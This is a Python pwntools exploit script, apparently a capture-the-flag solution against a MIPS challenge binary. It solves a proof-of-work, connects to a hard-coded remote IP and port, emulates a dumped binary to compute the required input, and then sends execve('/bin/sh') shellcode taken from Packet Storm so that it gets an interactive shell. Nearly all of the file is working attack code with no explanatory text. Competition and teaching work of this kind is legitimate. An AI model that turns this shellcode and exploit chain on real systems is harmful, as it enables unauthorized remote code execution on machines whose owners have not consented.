#!/usr/bin/env python3
from gzip import GzipFile
import itertools

from pwn import *
import emu


def solve_pow(io):
    assert io.recvline() == b'=========Pow========\n'
    alg, hexdigest = re.match(
        r'^hashlib\.(.+)\(s\)\.hexdigest\(\) == "(.+)"$',
        io.recvline().decode(),
    ).groups()
    alg = getattr(hashlib, alg)
    digest = bytes.fromhex(hexdigest)
    plainlen, = re.match(
        r'^len\(s\) == (\d+)\n$',
        io.recvline().decode(),
    ).groups()
    assert io.recvline() == b'>\n'
    for candidate in itertools.product(*([range(256)] * int(plainlen))):
        candidate = bytes(candidate)
        if alg(candidate).digest() == digest:
            io.sendline(candidate)
            return True
    return False


context.arch = 'mips'
os.environ['QEMU_LD_PREFIX'] = 'rootfs'
if args.LOCAL:
    if args.GDB:
        io = gdb.debug(['./samples/0'], gdbscript='''
layout asm
b *0x401bc8
b *0x401b10
b *0x401a08
b *0x40184c
b *0x40171c
b *0x401664
b *0x40155c
b *0x401414
b *0x4012e4
b *0x401128
b *0x400fe0
b *0x400ed0
b *0x400e08
b *0x400d40
b *0x400c8c
b *0x400b5c
b *0x400b30
c
''')
    else:
        io = process(['./samples/0'])
else:
    io = remote('106.53.114.216', 9999)
    assert solve_pow(io)
    assert io.recvline() == b'Binary Dump:\n'
    assert io.recvline() == b'===============\n'
    binary_dump_gz_b64 = io.recvline().decode()
    binary_dump_gz = base64.b64decode(binary_dump_gz_b64)
    binary_dump = GzipFile(fileobj=BytesIO(binary_dump_gz)).read()
if args.LOCAL:
    solution = bytes.fromhex(
        'da1ada1abb3dbb3d7def24b6f6fbb7b64b5d1669edf7edf787295cf25999ad717fe4e6c4bbf817b0c01f90c18ffd780a46480093c134fe043f7f3f7f87f361ad')
else:
    solution = emu.solve(binary_dump, 'ctf')
io.send(solution)
io.recvuntil(b'Name\n')
io.send(b'mslc')
io.recvuntil(b'Your time comes.\n> ')
# https://packetstormsecurity.com/files/105611/MIPS-execve-Shellcode.html
io.send(
    b"\xff\xff\x06\x28"
    b"\xff\xff\xd0\x04"
    b"\xff\xff\x05\x28"
    b"\x01\x10\xe4\x27"
    b"\x0f\xf0\x84\x24"
    b"\xab\x0f\x02\x24"
    b"\x0c\x01\x01\x01"
    b"/bin/sh"
)
io.interactive()
